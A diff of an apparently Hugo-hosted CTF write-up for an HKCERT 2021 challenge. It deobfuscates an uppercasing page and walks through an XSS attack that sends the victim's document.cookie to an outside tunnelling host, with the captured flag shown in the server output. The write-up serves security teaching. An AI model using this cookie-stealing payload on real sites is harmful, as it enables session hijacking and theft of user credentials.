@@ -66,7 +66,7 @@ We can see that this whole piece of code is uppercased. Also, the strings in the
 
 So we input this whole piece of JavaScript code into https://deobfuscate.io. This is what we get.
 
-{{< highlight javascript "linenostart=10" >}}
+```javascript {linenostart=10}
 TOUPPERCASE = "toUpperCase";
 SUBSTR = "substr";
 ENCODEURI = "encodeURI";
@@ -82,28 +82,28 @@ CONVERT = () => {
   INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
   OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
 };
-{{< / highlight >}}
+```
 
 ## Step 2: Analysing
 
 Now that the code is made readable, we can clean up the code and figure out the flow of how this page works.
 
 1. In **Line 7**, we can see that whenever the content in the text area is changed, a URL-encoded form of the content inside is appended to the current URL after a `#` (the hash part of the URL).
-{{< highlight html "linenostart=7" >}}
+```html {linenostart=7}
 <TEXTAREA ID="INPUT" ONCHANGE="window.location.hash=window.encodeURI(INPUT.value)" STYLE="WIDTH:400;HEIGHT:300"></TEXTAREA>
 <!-- the cleaned code above is equivalent to the original -->
-{{< / highlight >}}
+```
 2. In **Line 5**, we can see that whenever the page is loaded or the hash part in the current URL is changed, the `CONVERT` function is called.
-{{< highlight html "linenostart=5" >}}
+```html {linenostart=5}
 <BODY ONLOAD="CONVERT()" ONHASHCHANGE="CONVERT()">
-{{< / highlight >}}
+```
 3. The `CONVERT` function is essentially replacing the content in the text area with the URL-decoded form of the hash part of the current URL, and also setting the `srcdoc` attribute of the output iframe to the uppercased form of the content in the text area.
-{{< highlight javascript "linenostart=21" >}}
+```javascript {linenostart=21,hl_lines=[2]}
 CONVERT = () => {
   document.getElementById("INPUT").value = window.decodeURI(window.location.hash.substr(1)); // substr(1) removes the '#' prefix
   document.getElementById("OUTPUT").srcdoc = INPUT.value.toUpperCase();
 }; // the above code is cleaned and is equivalent to the original
-{{< / highlight >}}
+```
 
 ## Step 3: XSS Attack Procedure
 
@@ -153,13 +153,13 @@ In order for the victim's browser to send its cookie to my server, our XSS paylo
 
 The following is the XSS payload I used. The URL domain is the one provided by the tunnelling service.
 
-```javascript
+```javascript {linenos=false}
 location.href="https://7795a3052e14c9.lhr.domains/?"+document.cookie
 ```
 
 Then we will need to *JSFuck* the XSS payload, wraps it with the `script` tag, and type it into the input text area. Now you see the URL has changed, copy the URL and send it to the XSS Bot. Hooray! Now the flag shows up in the stdout of our server! `hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}`
 
-```
+```bash {linenos=false}
 $ go run server.go
 /?
 /?flag=hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}
